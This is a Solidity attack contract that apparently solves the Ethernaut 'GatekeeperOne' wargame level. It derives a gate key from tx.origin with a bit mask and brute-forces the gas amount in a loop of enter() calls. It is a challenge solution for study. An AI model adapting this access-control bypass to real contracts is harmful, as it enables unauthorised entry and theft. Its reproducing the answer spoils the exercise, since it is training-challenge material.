// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/level13.sol";
import "forge-std/console.sol";

contract GateKeeperOneAttack
{
    GatekeeperOne gateKeeperOne = GatekeeperOne(0xE295E5a35A2Ee951b3254ADB3d86a4aEEa4DB30E);

    function exploit() public 
    {
        bytes8  _gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);

        for (uint256 i=0; i< 300; i++)
        {
            (bool success, ) = address(gateKeeperOne).call{gas: i + (8191 * 3)}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success)
            {
                break;
            }
        }
    }
   
}
